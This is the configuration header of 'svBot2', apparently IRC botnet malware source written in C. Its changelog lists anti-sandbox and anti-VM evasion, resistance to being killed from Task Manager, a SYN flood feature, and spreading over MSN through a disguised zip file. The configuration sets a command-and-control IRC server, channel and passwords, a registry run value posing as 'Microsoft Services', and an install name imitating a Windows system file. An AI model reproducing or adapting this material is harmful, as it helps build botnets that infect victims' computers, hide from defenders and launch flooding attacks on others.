/* svBot2 */

// Origional base by a59
// http://unkn0wn.eu/board/viewtopic.php?f=70&t=13004

// Changelog: (By h1t3m)
//
//	12/Sep/2008 Anti-SandBox for Anubis, CWSandbox, Norman, Sandboxi, VMWare and Nephasis honeypot added.
//	17/Sep/2008 Modified and extended base, Also renamed values. (For look and to be tidy)
//	17/Sep/2008 Made taskmanager unable to kill bot.
//  18/Sep/2008 Added Syn Flood.
//	18/Sep/2008 Added Join/Part Channels.
//  18/Sep/2008 Added MSN SendFile Spread. (Email.photobucket.com > Email.photobucket.com.zip).
//	19/Sep/2008 Added IRC features (PRIVMSG, OP, DEOP, ETC)

//
// Working on:
//
//	Honeypot to catch spreading malware and vnc bots. (%60 done).
//

/* Main Configuration */

// Note: Remember to edit Im.cpp and change IM messages and Channel

unsigned short Port = 0x29ff;	// Bot port in network byte order
char* btHost  = "bawtz.net";	// Your IRC Server
char* btPass  = "bawtz";		// IRCD Pass
char* btChan  = "#kill";		// Bot Channel
char* btCP    = "root";			// Bot Channel Pass

char* btRNVal = "Microsoft Services";// Bot Registry Value
char* btDir   = "C:\\WINDOWS";	// Folder exe Will Be Installed
char* btEXE   = "scrss.exe";	// Bot Exe Name

